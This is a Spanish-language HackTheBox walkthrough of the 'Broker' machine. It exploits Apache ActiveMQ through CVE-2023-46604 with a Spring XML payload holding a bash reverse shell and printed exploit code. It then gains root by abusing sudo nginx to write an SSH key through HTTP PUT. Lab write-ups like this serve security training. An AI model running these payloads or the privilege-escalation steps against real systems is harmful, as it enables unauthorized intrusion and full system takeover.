Propiedades:
- OS: Linux 
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #nginx #deserialization #apache-mq #CVE-2023-46604

![](assets/Pasted%20image%2020251219164656.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

- ttl de 63 indica maquina linux

```bash
> ping -c 1 10.129.230.87
PING 10.129.230.87 (10.129.230.87) 56(84) bytes of data.
64 bytes from 10.129.230.87: icmp_seq=1 ttl=63 time=85.7 ms

--- 10.129.230.87 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 85.656/85.656/85.656/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- -Pn -n -vvv -sS --min-rate 5000 10.129.230.87
--------------------------------------------------------------
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     REASON
22/tcp    open  ssh         syn-ack ttl 63
80/tcp    open  http        syn-ack ttl 63
1883/tcp  open  mqtt        syn-ack ttl 63
5672/tcp  open  amqp        syn-ack ttl 63
8161/tcp  open  patrol-snmp syn-ack ttl 63
46099/tcp open  unknown     syn-ack ttl 63
61613/tcp open  unknown     syn-ack ttl 63
61614/tcp open  unknown     syn-ack ttl 63
61616/tcp open  unknown     syn-ack ttl 63
```

- Podemos ver bastantes puertos abiertos como 80 http, 22 ssh, 1883 mqtt entre otros.

Sobre los puertos abiertos voy a realizar un segundo escaneo mas profundo para detectar versiones, servicios y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 22,80,1883,5672,8161,46099,61613,61614,61616 -sV -sC -sS --min-rate 5000 -Pn -n 10.129.230.87 -oA nmap/target
--------------------------------------------------------------------------------------------------------------------------------
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
46099/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title'.
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.94SVN%I=7%D=12/19%Time=6945D6AB%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\
SF:x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S
SF:\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x2
SF:0client\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89
SF:,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04
SF:\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0
SF:M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20usin
SF:g\x20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\
SF:0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\
SF:0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11am
SF:qp:decode-error\xa17Connection\x20from\x20client\x20using\x20unsupporte
SF:d\x20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\
SF:0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0
SF:`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa
SF:17Connection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attem
SF:pted")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\
SF:x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\
SF:0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Conn
SF:ection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")
SF:%r(DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02
SF:\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0
SF:S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\
SF:x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLS
SF:essionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10
SF:\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x0
SF:1\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cl
SF:ient\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCoo
SF:kie,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x
SF:0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x
SF:1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x
SF:20using\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.94SVN%I=7%D=12/19%Time=6945D6A5%P=x86_64-pc-linux-gnu
SF:%r(HELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20S
SF:TOMP\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Pro
SF:tocolException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.ap
SF:ache\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Pr
SF:otocolConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.
SF:stomp\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)
SF:\n\tat\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume
SF:\(TransportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport
SF:\.tcp\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apac
SF:he\.activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215
SF:\)\n\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61616-TCP:V=7.94SVN%I=7%D=12/19%Time=6945D6A5%P=x86_64-pc-linux-gnu
SF:%r(NULL,140,"\0\0\x01<\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\x0c\0\
SF:x11TcpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize
SF:\x05\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceEnabled
SF:\x01\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x01\0\x
SF:14TightEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0
SF:\x15MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationI
SF:nitalDelay\x06\0\0\0\0\0\0'\x10\0\x0fProviderVersion\t\0\x075\.15\.15");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH: OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
- Puerto 80 HTTP: nginx/1.18.0
- Puerto 1883: mqtt
- Puerto 5672:  amqp?
- Puerto 8161 HTTP: Jetty 9.4.39.v20210325
- Puerto 46099: tcpwrapped
- Puerto 61613: Apache ActiveMQ
- Puerto 61614: Jetty 9.4.39.v20210325
- Puerto 61616: ActiveMQ OpenWire transport

## Enumeración

### Puerto 80 HTTP nginx

En este puerto se encuentra **nginx**, el cual actúa como **reverse proxy**, redirigiendo las peticiones hacia **Apache ActiveMQ**.

**Apache ActiveMQ** es un **broker de mensajería open source basado en Java**, utilizado para la **comunicación asíncrona entre servicios**, permitiendo el intercambio de mensajes mediante distintos protocolos de mensajería.

- Lo primero que me apareció una vez me metí a la pagina fue un login al cual ingrese con las credenciales default admin:admin

![](assets/Pasted%20image%2020251219165530.png)

Al momento de darle al boton de **Manage ActiveMQ broker** me tope con esto:

- Version 5.15.15 de ActiveMQ

![](assets/Pasted%20image%2020251219170351.png)

Otra cosa a tener en cuenta es que los otros puertos/servicios también se esta redirigiendo al **Active MQ**

- Puerto 8161

![](assets/Pasted%20image%2020251219170527.png)


## Explotación

Sabemos que la version de ActiveMQ es la `5.15.15` por lo cual decidí buscar por CVE y me encontré con el siguiente [CVE-2023-46604](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-19047/version_id-778268/year-2023/opec-1/Apache-Activemq-5.15.15.html) que consiste en una ejecución remota de comandos a traves de una deserialización. 

Todo el codigo que utilizamos es parte del siguiente [PoC](https://github.com/strikoder/CVE-2023-46604-ActiveMQ-RCE-Python) por lo que es necesario clonar el repositorio.

Lo primero que deberemos hacer es generar el payload que consistirá en una reverse-shell.

```bash
python3 generate_poc.py -i $YOUR_IP -p 1001
```

El comando anterior generara un Payload que no es mas que un XML malicioso llamado `poc-linux.xml`.

- `<beans>`: un bean es un objeto controlado por el framework Spring 
- Utilizamos la clase nativa de java `java.lang.ProcessBuilder` para ejecutar comandos del sistema.
- Ejecutamos el comando `<value>bash -i &#x3E;&#x26; /dev/tcp/10.10.15.110/1001 0&#x3E;&#x26;1</value>` que consiste en la reverse-shell.

Básicamente lo que sucede es.

- Se crea un objeto (bean) de la clase `ProcessBuilder`, se le pasa el comando en `value` (rev-shell) y el comando se ejecuta directamente con gracias al `init-method="start"`

```bash
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <value>bash -i &#x3E;&#x26; /dev/tcp/10.10.15.110/1001 0&#x3E;&#x26;1</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

Ahora el `main.py` lo que va a hacer es:

- Construye un paquete OpenWire malicioso
- Se conecta por **socket TCP** a ActiveMQ
- Utilizando la clase `ClassPathXmlApplicationContext` ejecuta nuestro Payload (XML) de manera remota.
- ActiveMQ de serializa sin validar
- Spring carga el XML
- El XML se ejecuta como explique anteriormente.

```bash
def main():
    parser = argparse.ArgumentParser(description="ActiveMQ RCE PoC")
    parser.add_argument("-i", dest="ip", required=True, help="ActiveMQ Server IP or Host")
    parser.add_argument("-p", dest="port", default="61616", help="ActiveMQ Server Port")
    parser.add_argument("-u", dest="url", required=True, help="Spring XML URL")
    args = parser.parse_args()

    banner()

    class_name = "org.springframework.context.support.ClassPathXmlApplicationContext"
    message = args.url

    header = "1f00000000000000000001"
    body = (
        header
        + "01"
        + int2hex(len(class_name), 4)
        + string2hex(class_name)
        + "01"
        + int2hex(len(message), 4)
        + string2hex(message)
    )
    payload = int2hex(len(body) // 2, 8) + body
    data = binascii.unhexlify(payload)

    print(f"[*] Target: {args.ip}:{args.port}")
    print(f"[*] XML URL: {args.url}\n")
    print(f"[*] Sending packet: {payload}")

    with socket.create_connection((args.ip, int(args.port))) as conn:
        conn.sendall(data)
```

Antes de ejecutar el payload es necesario ponernos en escucha y levantar un servidor python en la ruta donde tengamos el `poc-linux.xml`

```bash
> sudo python3 -m http.server 80
[sudo] password for wndr: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
> sudo nc -nlvp 1001
```

Ahora podremos ejecutar el payload pasándole la IP victima y la URL de nuestro `poc-linux.xml`

```bash
> python3 main.py -i 10.129.10.253 -u http://10.10.15.110/poc-linux.xml

     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.129.10.253:61616
[*] XML URL: http://10.10.15.110/poc-linux.xml

[*] Sending packet: 000000741f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010021687474703a2f2f31302e31302e31352e3131302f706f632d6c696e75782e786d6c
```


Recibimos conexión.

```bash
Connection received on 10.129.10.253 54808
bash: cannot set terminal process group (880): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$ id
id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```

## Escalada de Privilegios

Obtenemos la primera flag en el directorio home

```bash
activemq@broker:~$ cat user.txt
cat user.txt
843f91a31c401***
```

Enumere binarios con privilegios de SUDO y me encuentro con `nginx`

- nginx tiene varias funciones, una de ellas es actuar como servidor web.

```bash
activemq@broker:~$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Con ayuda del comando `-h` podemos ver un poco mas de las funciones de `nginx`

```bash
activemq@broker:~$ sudo /usr/sbin/nginx -h 
sudo /usr/sbin/nginx -h
nginx version: nginx/1.18.0 (Ubuntu)
Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives]

Options:
  -?,-h         : this help
  -v            : show version and exit
  -V            : show version and configure options then exit
  -t            : test configuration and exit
  -T            : test configuration, dump it and exit
  -q            : suppress non-error messages during configuration testing
  -s signal     : send signal to a master process: stop, quit, reopen, reload
  -p prefix     : set prefix path (default: /usr/share/nginx/)
  -c filename   : set configuration file (default: /etc/nginx/nginx.conf)
```

- A nosotros el que nos interesa es `-c filename` 

Vamos a crear un archivo de configuración en nuestra maquina para desplegar una web.

- _user root_: nginx va a correr como root.
- http {}: Definimos un servidor http que escucha por el puerto 1339
- root /: Definimos todo el filesystem `/` como la raíz de la web.
- autoindex on; nos permite listar los directorios expuestos basado en la directiva root en este caso nos va a permitir ver todo el filesystem.
- dav_methods PUT nos permite subir archivos.

```bash
> cat nginx-pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;

events {
    worker_connections 768;
}

http {
    server {
        listen 1339;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

Me transferí el archivo de configuración a la maquina victima.

```bash
activemq@broker:~$ wget http://10.10.15.110/nginx-pwn.conf
wget http://10.10.15.110/nginx-pwn.conf
--2025-12-19 23:31:11--  http://10.10.15.110/nginx-pwn.conf
Connecting to 10.10.15.110:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 204 [application/octet-stream]
Saving to: ‘nginx-pwn.conf’

     0K                                                       100% 20.1M=0s

2025-12-19 23:31:11 (20.1 MB/s) - ‘nginx-pwn.conf’ saved [204/204]
```

Utilizaremos la función `-c` para desplegar un archivo de configuración.

- Si no nos promptea nada es que todo salió bien.

```bash
activemq@broker:~$ sudo /usr/sbin/nginx -c /home/activemq/nginx-pwn.conf   
sudo /usr/sbin/nginx -c /home/activemq/nginx-pwn.conf
```

Ahora generaremos un par de claves SSH:

```bash
activemq@broker:~$ ssh-keygen
-------------------------------
The key's randomart image is:
+---[RSA 3072]----+
|   .BB+o.o.    E*|
|    .. o+   . o /|
|     . +o. o   X=|
|    o = o.+ . + o|
|   . = +SB . o + |
|    . . * o   o  |
|       . o       |
|        .        |
|                 |
+----[SHA256]-----+
```

Nuestro servidor permite la subida de archivos mediante HTTP PUT, lo que nos permite **escribir nuestra clave pública en `root/.ssh/authorized_keys`**.  
De esta forma, se habilita el acceso SSH al usuario root utilizando la **clave privada previamente generada**.

```bash
activemq@broker:~/.ssh$ curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat id_rsa.pub)"
<39/root/.ssh/authorized_keys -d "$(cat id_rsa.pub)"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   568    0     0  100   568      0  48617 --:--:-- --:--:-- --:--:-- 56800
```

Ahora nos pasamos una copia de la llave privada id_rsa a nuestra maquina y le colocamos los permisos necesarios.

```bash
> cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtreBqOQZeJG4O80+b5rAlh6wC6U8p3bP/MHCqgetLtBG1ZEnaSWs
frzr8Y5zoxKm4n+UG5l/yr1wmK6on6cTtEnQmHdNac9ZLkEfF+DFyPzQsFxuwoumIAFEI7
++xKAGErP1CJw7jU0c3apmeGGNQ+VtSwEFG5NALEbg47ku/78uPK8ZJ1pqE+z7m7VNYFyv
<SNIP..>
> chmod 600 id_rsa
```

Nos conectamos por SSH y somos root.

```bash
> ssh -i id_rsa root@10.129.230.87
---------------------------------------------------------------------
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

root@broker:~# id
uid=0(root) gid=0(root) groups=0(root)
root@broker:~# ls
cleanup.sh  root.txt
root@broker:~# cat root.txt
2ee06c4dcc6d3c****

```

***PWNED***

![](assets/Pasted%20image%2020251219175032.png)